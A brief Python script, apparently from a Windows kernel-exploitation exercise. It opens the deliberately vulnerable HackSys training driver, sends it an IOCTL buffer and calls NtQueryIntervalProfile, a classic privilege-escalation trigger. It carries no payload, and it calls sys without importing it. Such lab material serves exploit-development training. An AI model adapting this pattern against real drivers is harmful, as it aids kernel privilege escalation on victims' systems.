from ctypes import *

def main():
	hevDevice = windll.kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver_mbks", 0xC0000000, 0, None, 0x3, 0, None)
	if not hevDevice or hevDevice == -1:
		print("Couldn't get Device Driver handle")
		sys.exit(-1)
	
	count = 10	
	buf = chr((count % 255) + 1) * count
	bufLength = len(buf)
	windll.kernel32.DeviceIoControl(hevDevice, 0x22240B, buf, bufLength, None, 0, byref(c_ulong()), None)
	print("send bytes: ")
	print (bufLength)
	windll.ntdll.NtQueryIntervalProfile(0x1337, byref(c_ulong()))

if __name__ == "__main__":
	main()
